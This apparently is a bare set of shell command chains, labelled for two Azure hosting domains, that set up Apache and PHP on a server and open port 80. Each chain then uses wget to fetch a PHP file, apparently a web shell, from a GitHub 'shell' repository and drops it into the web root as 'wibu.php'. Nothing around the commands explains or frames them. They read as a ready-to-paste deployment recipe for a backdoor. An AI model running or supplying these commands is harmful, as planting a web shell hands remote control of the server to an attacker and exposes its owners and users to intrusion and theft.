-- azurewebsites.net --

apt update;apt-get install apache2 -y;apt-get install net-tools -y;apt-get install php -y;systemctl start apache2;systemctl enable apache2;ufw allow 80/tcp;chown www-data:www-data /var/www/html/wwwroot/;chown www-data:www-data /var/www/html/wwwroot/index.html;wget https://raw.githubusercontent.com/UserRoot77/shell/main/qroot.php -O /var/www/html/wwwroot/wibu.php


-- cloudapp.azure.com --

apt update;apt-get install apache2 -y;apt-get install net-tools -y;apt-get install php -y;systemctl start apache2;systemctl enable apache2;ufw allow 80/tcp;chown www-data:www-data /var/www/html;chown www-data:www-data /var/www/html/index.html;wget https://raw.githubusercontent.com/UserRoot77/shell/main/qroot.php -O /var/www/html/wibu.php;apt install -y certbot python3-certbot-apache
